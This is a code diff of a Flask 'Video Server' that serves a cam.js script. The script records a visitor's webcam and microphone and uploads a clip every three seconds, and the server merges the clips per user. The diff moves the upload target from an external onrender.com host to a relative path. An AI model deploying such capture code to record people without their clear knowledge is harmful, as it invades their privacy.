@@ -1,14 +1,26 @@
-from flask import Flask, request, send_from_directory, jsonify
-import os, shutil, threading, time, uuid, subprocess
+from flask import Flask, request, send_from_directory
+import os, shutil, threading, time, uuid
 from datetime import datetime
-from flask_cors import CORS
 
 app = Flask(__name__)
-CORS(app)
-CHUNK_DIR = os.path.join(os.getcwd(), 'videos', 'chunks')
-FINAL_DIR = os.path.join(os.getcwd(), 'videos', 'final')
+BASE_DIR = os.getcwd()
+CHUNK_DIR = os.path.join(BASE_DIR, 'videos', 'chunks')
+FINAL_DIR = os.path.join(BASE_DIR, 'videos', 'final')
 os.makedirs(CHUNK_DIR, exist_ok=True)
 os.makedirs(FINAL_DIR, exist_ok=True)
+
+def merge_chunks(user_id):
+    user_path = os.path.join(CHUNK_DIR, user_id)
+    files = sorted([os.path.join(user_path, f) for f in os.listdir(user_path)])
+    if not files:
+        return
+    filename = f"{user_id}_{datetime.now().strftime('%H%M%S')}_{uuid.uuid4().hex[:5]}.webm"
+    out_path = os.path.join(FINAL_DIR, filename)
+    with open(out_path, 'wb') as merged:
+        for file in files:
+            with open(file, 'rb') as f:
+                merged.write(f.read())
+    shutil.rmtree(user_path, ignore_errors=True)
 
 def monitor_user_chunks(user_id):
     user_path = os.path.join(CHUNK_DIR, user_id)
@@ -17,17 +29,17 @@ def monitor_user_chunks(user_id):
         time.sleep(2)
         if not os.path.exists(user_path):
             return
-        last_modified = max(os.path.getmtime(os.path.join(user_path, f)) for f in os.listdir(user_path))
-        if last_modified > last_seen:
-            last_seen = last_modified
-    files = sorted([os.path.join(user_path, f) for f in os.listdir(user_path)])
-    if files:
-        uid = uuid.uuid4().hex[:8]
-        output_file = os.path.join(FINAL_DIR, f"{user_id}_{uid}.webm")
-        subprocess.call(['ffmpeg', '-y'] + sum([['-i', f] for f in files], []) +
-                        ['-filter_complex', f"concat=n={len(files)}:v=1:a=1", output_file],
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        shutil.rmtree(user_path)
+        try:
+            last_modified = max(os.path.getmtime(os.path.join(user_path, f)) for f in os.listdir(user_path))
+            if last_modified > last_seen:
+                last_seen = last_modified
+        except:
+            return
+    merge_chunks(user_id)
+
+@app.route('/')
+def home():
+    return '<h2>Video Server</h2><p><a href="/cam.js">/cam.js</a> | <a href="/rndr">/rndr</a></p>'
 
 @app.route('/cam.js')
 def camjs():
@@ -41,7 +53,7 @@ navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream =>
     let form = new FormData();
     form.append('video', blob);
     form.append('uid', user_id);
-    fetch('https://chorcha-video.onrender.com/upload', { method: 'POST', body: form });
+    fetch('/upload', { method: 'POST', body: form });
   };
   mediaRecorder.start();
   setInterval(() => mediaRecorder.stop(), 3000);
